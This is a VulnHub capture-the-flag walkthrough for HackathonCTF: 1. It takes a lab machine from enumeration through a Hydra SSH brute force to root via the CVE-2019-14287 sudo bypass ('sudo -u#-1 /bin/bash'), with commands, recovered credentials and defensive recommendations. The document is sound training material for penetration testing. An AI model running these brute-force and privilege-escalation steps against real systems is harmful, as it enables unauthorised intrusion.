# HackathonCTF: 1 (VulnHub)

## Overview

**HackathonCTF: 1** is an Easy-level VulnHub machine created by **Somu Sen**. This machine focuses on web enumeration, information disclosure, Base64 decoding, SSH brute forcing, Linux enumeration, and privilege escalation by exploiting **CVE-2019-14287** through an insecure sudo configuration.

The walkthrough demonstrates how seemingly harmless files such as **robots.txt**, hidden web pages, exposed command history, and weak credentials can be chained together to achieve complete system compromise.

---

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | HackathonCTF: 1 |
| Author | Somu Sen |
| Series | HackathonCTF |
| Platform | VulnHub |
| Release Date | 27 October 2020 |
| Difficulty | Easy |
| Target OS | Ubuntu Linux |
| Attacker Machine | Kali Linux |
| Objective | Obtain User and Root Access |

---

## Skills Demonstrated

- Network Enumeration
- Service Enumeration
- Nmap Scanning
- Web Enumeration
- robots.txt Analysis
- Directory Brute Forcing
- Gobuster
- Source Code Analysis
- Base64 Decoding
- Information Disclosure
- Username Enumeration
- SSH Brute Force
- Hydra
- SSH Enumeration
- Linux Enumeration
- Bash History Analysis
- Credential Discovery
- Password Recovery
- Sudo Enumeration
- CVE-2019-14287 Exploitation
- Linux Privilege Escalation
- Root Compromise
- Post Exploitation

---

## Tools Used

- Netdiscover
- Nmap
- Gobuster
- Hydra
- SSH
- Base64
- Linux Enumeration Commands
- Kali Linux

---

## Attack Methodology

1. Discover the target machine.
2. Enumerate open ports and services.
3. Analyze robots.txt.
4. Enumerate hidden web directories.
5. Decode Base64 hints.
6. Discover the SSH username.
7. Brute force SSH credentials.
8. Obtain SSH access.
9. Analyze Bash history.
10. Recover hidden credentials.
11. Enumerate sudo permissions.
12. Exploit CVE-2019-14287.
13. Obtain root access.

---

## Network Discovery

Identify the target.

```bash
sudo netdiscover -i eth0
```

Result:

```text
192.168.10.14
```

The target machine was successfully identified.

---

## Service Enumeration

Perform a full TCP scan.

```bash
sudo nmap -A -p- 192.168.10.14 --min-rate 10000
```

### Open Ports

| Port | Service | Version |
|------|----------|---------|
| 21 | FTP | vsftpd |
| 23 | Telnet | Linux telnetd |
| 80 | HTTP | Apache 2.4.7 |
| 7223 | SSH | OpenSSH |

### Key Findings

- robots.txt exposed hidden directories.
- SSH service running on a non-standard port (7223).
- Multiple hidden web pages discovered.
- Web application became the primary attack surface.

---

## Web Enumeration

Browse the target.

```text
http://192.168.10.14
```

The default page contains very little information.

Run Gobuster.

```bash
gobuster dir -u http://192.168.10.14/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt,old,bak
```

### Discovered Files

```text
/index.html
/robots.txt
/ctf.html
/ftc.html
/sudo.html
```

---

## robots.txt Analysis

Read the robots file.

```text
User-agent: *
Disallow: /ctf

User-agent: *
Disallow: /ftc

User-agent: *
Disallow: /sudo

c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==
```

Decode the Base64 string.

```bash
echo "c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==" | base64 -d
```

Output:

```text
ssh-bruteforce-sudoit
```

This hint suggests brute forcing SSH followed by sudo exploitation.

---

## Username Discovery

Visit:

```text
http://192.168.10.14/sudo.html
```

Inspect the page source.

Recovered username:

```text
test
```

---

## SSH Password Brute Force

Use Hydra.

```bash
hydra -l test -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.14:7223 -t 5
```

Recovered credentials:

```text
Username: test
Password: jordan23
```

---

## SSH Access

Login.

```bash
ssh test@192.168.10.14 -p 7223
```

Verify.

```bash
whoami
```

Output:

```text
test
```

Initial foothold obtained.

---

## Bash History Enumeration

Inspect command history.

```bash
cat ~/.bash_history
```

Interesting directory discovered.

```text
/media/floppy/media/imp
```

Navigate to it.

```bash
cd /media/floppy/media/imp
ls
```

Discovered file:

```text
pass.txt
```

Read the file.

```bash
cat pass.txt
```

Contents:

```text
Q1RGZGZyR0hZalVzU3NLS0AxMjM0NQo=
```

---

## Password Recovery

Decode the Base64 string.

```bash
echo "Q1RGZGZyR0hZalVzU3NLS0AxMjM0NQo=" | base64 -d
```

Recovered password:

```text
CTFdfrGHYjUsSsKK@12345
```

Useful during privilege escalation.

---

## Sudo Enumeration

Check sudo permissions.

```bash
sudo -l
```

Output:

```text
(ALL, !root) ALL
```

This configuration is vulnerable to **CVE-2019-14287**.

---

## Privilege Escalation

Exploit the vulnerable sudo configuration.

```bash
sudo -u#-1 /bin/bash
```

Verify.

```bash
whoami
```

Output:

```text
root
```

Confirm privileges.

```bash
id
```

Output:

```text
uid=0(root)
gid=0(root)
groups=0(root)
```

Root access successfully obtained.

---

## Vulnerabilities Identified

### 1. Information Disclosure

Sensitive hints were exposed through:

- robots.txt
- Hidden web pages

### 2. Username Disclosure

Page source code revealed a valid SSH username.

### 3. Weak SSH Password

The SSH password was vulnerable to dictionary attacks using Hydra.

### 4. Command History Exposure

Sensitive filesystem locations were exposed in `.bash_history`.

### 5. Sensitive Data Exposure

A Base64-encoded password was stored in:

```text
/media/floppy/media/imp/pass.txt
```

### 6. Vulnerable Sudo Configuration

```text
(ALL, !root) ALL
```

Allowed privilege escalation using **CVE-2019-14287**.

---

## Attack Chain Summary

- Target Discovery using Netdiscover
- Service Enumeration with Nmap
- robots.txt Analysis
- Hidden Directory Discovery
- Base64 Hint Decoding
- Username Enumeration
- SSH Brute Force using Hydra
- SSH Login
- Bash History Enumeration
- Password Recovery
- Sudo Enumeration
- CVE-2019-14287 Exploitation
- Root Shell
- Full System Compromise

---

## Security Recommendations

- Avoid exposing sensitive information in robots.txt.
- Remove hidden credentials from web pages.
- Enforce strong password policies.
- Disable unnecessary services such as Telnet.
- Secure Bash history files.
- Never store credentials in Base64.
- Update vulnerable sudo versions.
- Apply the principle of least privilege.
- Perform regular security assessments.
- Monitor authentication attempts.

---

## Key Learning Outcomes

- Thorough enumeration reveals hidden attack paths.
- robots.txt can expose sensitive information.
- Hidden web pages may leak usernames.
- Base64 encoding is not encryption.
- Weak passwords are vulnerable to dictionary attacks.
- Bash history often contains valuable post-exploitation information.
- Understanding CVE-2019-14287 is important for Linux privilege escalation.
- Multiple small weaknesses can be chained together to achieve full system compromise.

---

## Conclusion

HackathonCTF: 1 is an excellent beginner-friendly VulnHub machine that teaches the importance of careful enumeration, information disclosure analysis, SSH password attacks, Linux post-exploitation, and privilege escalation using **CVE-2019-14287**. It demonstrates how several seemingly minor security weaknesses can combine to result in complete system compromise.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
